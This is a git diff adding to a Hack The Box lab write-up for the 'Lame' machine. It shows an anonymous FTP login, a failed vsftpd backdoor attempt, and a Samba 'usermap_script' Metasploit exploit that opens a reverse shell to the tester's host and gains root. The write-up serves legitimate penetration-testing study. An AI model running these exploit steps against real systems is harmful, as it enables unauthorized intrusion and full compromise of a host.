@@ -126,3 +126,107 @@ Nmap done: 1 IP address (1 host up) scanned in 141.97 seconds
  - 3632 distccd?
   - `distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))`
   - This is a p2p network distributed C/C++ compiler
+
+Logged in to `ftp 10.10.10.3` as `anonymous`, but the cupboards seem bare...
+
+```shell
+thoth@kali:~/Projects/htb-notes/machines/Lame$ ftp 10.10.10.3
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:thoth): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> pwd
+257 "/"
+```
+
+Attempting to place a file fails:
+
+```shell
+ftp> put test.txt
+local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+553 Could not create file.
+```
+
+There does appear to be a metasploit lead:
+
+```shell
+msf5 > search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+```
+
+It fails.
+
+```shell
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+```
+
+Performed an SMB version scan:
+
+```shell
+msf5 auxiliary(scanner/smb/smb_version) > run
+
+[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
+```
+
+## Metasploit Success
+
+Searched for the `3.0.20` version in MSF:
+
+```shell
+msf5 > search 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank       Check  Description
+   -  ----                                                   ---------------  ----       -----  -----------
+   0  auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
+   1  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+msf5 > use 1
+msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP double handler on 10.10.14.53:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo FKrQJOaETOA0KVVF;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "FKrQJOaETOA0KVVF\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.53:4444 -> 10.10.10.3:51941) at 2020-05-04 22:29:07 -0400
+
+whoami
+root
+hostname
+lame
+```
+
+Found user flag in `/home/makis/user.txt`
+
+Root flag in `/root/root.txt`
